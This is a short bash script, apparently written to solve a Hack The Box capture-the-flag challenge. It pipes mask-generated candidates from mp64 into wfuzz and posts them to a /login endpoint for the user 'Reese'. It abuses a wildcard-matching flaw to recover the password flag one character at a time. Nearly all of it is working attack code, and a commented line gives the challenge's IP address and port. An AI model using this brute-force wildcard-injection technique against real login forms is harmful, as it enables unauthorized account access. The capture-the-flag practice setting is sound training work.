#!/bin/bash

ip=$1
port=$2
partial=$3
pass=$partial
wildcard="*"

function fuzz {

	clear
	echo "$pass"

	#efficiently generate the pattern
	test=$(mp64 --custom-charset1=?l?u?d{}_ $pass?1$wildcard \
	| wfuzz -v -X POST -z stdin --follow -u "http://${ip}:${port}/login" -d "username=Reese&password=FUZZ" 2> /dev/null \
	| grep -v "http" | grep -v "Auth" | grep -v "failed" | grep -w -o "HTB[^\"]*");
	#echo "cmd out: $pass"
	pass=${test//\*/}
	#echo "Fuzzing: $pass"

}


for char in {1..40} 
do
	fuzz
done

#mp64 --custom-charset1=?l?u?d{}_ HTB{?1* 
#|  wfuzz -z stdin --follow -u http://206.189.121.131:31946/login -X POST -v -d "username=Reese&password=FUZZ" 
#| grep -v "http"| grep -v "Auth" | grep -v "failed" | grep -w -o "HTB[^\"]*"
